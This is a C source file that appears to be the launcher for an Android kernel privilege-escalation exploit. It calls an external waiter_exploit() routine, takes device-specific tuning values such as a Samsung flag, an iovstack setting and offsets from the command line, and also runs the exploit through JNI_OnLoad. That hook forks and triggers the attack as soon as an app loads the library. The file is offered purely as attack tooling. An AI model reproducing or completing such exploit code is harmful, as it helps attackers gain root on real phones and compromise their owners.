#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <jni.h>
#include "log.h"

extern int waiter_exploit();
extern int config_new_samsung;
extern int config_iovstack;
extern int config_offset;
extern int config_force_remove;

void init_exploit() {

    LOGV("[+] <main> parent pid = %d", getpid());

	int retval = waiter_exploit();

	LOGV("Exploit result %d\n", retval);
}


int main(int argc, char **argv) {

	if (argc > 4) {
		config_new_samsung = atoi(argv[1]);
		config_iovstack = atoi(argv[2]);
		config_offset = atoi(argv[3]);
		config_force_remove = atoi(argv[4]);
	}

	init_exploit();

	exit(EXIT_SUCCESS);
}

JNIEXPORT jint JNICALL JNI_OnLoad( JavaVM *vm, void *pvt )
{
	JNIEnv *env;
	LOGV("onload, uid=%d\n", getuid());

	if((*vm)->GetEnv(vm, (void **)&env, JNI_VERSION_1_4) != JNI_OK)
	{
		return -1;
	}

	int pid = fork();
	if (pid == 0) {
		init_exploit();
	}
	return JNI_VERSION_1_4;
}

JNIEXPORT void JNICALL JNI_OnUnload( JavaVM *vm, void *pvt )
{
}
